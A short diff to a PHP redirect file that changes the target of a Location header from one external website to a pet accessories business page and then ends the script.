@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.boosterinterior.us/nort");
+header("Location: https://libra-pet-accessories.business.site/");
 die();
 ?>
